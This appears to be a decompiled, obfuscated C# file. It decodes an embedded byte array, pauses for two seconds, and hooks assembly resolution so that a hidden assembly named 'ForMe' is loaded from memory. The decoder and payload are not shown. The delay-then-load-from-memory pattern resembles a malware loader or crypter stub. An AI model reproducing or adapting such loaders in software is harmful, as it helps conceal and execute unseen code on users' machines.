using System;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace ns0;

internal sealed class Class1 : Label
{
	[CompilerGenerated]
	private sealed class Class2
	{
		public byte[] byte_0;

		internal Assembly method_0(object object_0, ResolveEventArgs resolveEventArgs_0)
		{
			AppDomain appDomain = (AppDomain)object_0;
			if (resolveEventArgs_0.Name.Contains("ForMe"))
			{
				return appDomain.Load(byte_0);
			}
			return null;
		}
	}

	static Class1()
	{
		byte[] byte_0 = Class0.smethod_1(Class0.smethod_2());
		Class0.smethod_0(2000L);
		AppDomain.CurrentDomain.AssemblyResolve += delegate(object object_0, ResolveEventArgs resolveEventArgs_0)
		{
			AppDomain appDomain = (AppDomain)object_0;
			return resolveEventArgs_0.Name.Contains("ForMe") ? appDomain.Load(byte_0) : null;
		};
	}

	[STAThread]
	public static void Main()
	{
		Control1.smethod_0();
	}
}
